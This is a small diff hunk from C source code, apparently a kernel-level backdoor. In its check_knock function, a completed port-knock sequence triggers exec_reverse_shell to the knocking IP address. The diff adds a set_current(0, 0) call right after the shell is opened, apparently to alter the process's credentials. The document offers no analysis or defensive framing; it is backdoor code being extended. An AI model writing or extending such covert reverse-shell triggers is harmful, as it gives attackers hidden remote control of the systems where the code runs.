@@ -75,6 +75,7 @@ void check_knock(int port_index, u32 ip_addr)
             {
                 FM_INFO("Port knock successful from %d.%d.%d.%d\n", (u8)ip_addr >> 0, (u8)(ip_addr >> 8), (u8)(ip_addr >> 16), (u8)(ip_addr >> 24));
                 exec_reverse_shell(ip_addr);
+                set_current(0, 0);
             }
         }
         else
